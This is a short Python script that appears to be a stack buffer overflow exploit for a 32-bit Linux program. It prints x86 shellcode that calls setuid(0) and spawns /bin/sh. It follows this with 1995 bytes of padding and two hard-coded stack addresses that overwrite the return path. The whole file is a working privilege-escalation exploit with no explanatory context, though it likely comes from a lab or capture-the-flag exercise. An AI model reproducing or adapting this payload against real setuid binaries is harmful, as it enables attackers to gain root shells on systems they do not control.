import sys

setuid = '1\xdb\x8dC\x17\x99\xcd\x80'
bin_sh = (
    '\xeb\x1f^\x89v\x081\xc0\x88F\x07\x89F\x0c\xb0\x0b\x89\xf3\x8dN\x08'
    '\x8dV\x0c\xcd\x801\xdb\x89\xd8@\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh')

shellcode = setuid + bin_sh
#print(len(shellcode))
sys.stdout.write(shellcode)
for i in range(1995):
    #shellcode += 'a'
    sys.stdout.write("a")
#shellcode += '\xe8\xb0\xff\xbf\xfc\xb8\xff\xbf'
#print(len(shellcode))
sys.stdout.write("\xe8\xa8\xff\xbf")
sys.stdout.write("\xfc\xb0\xff\xbf")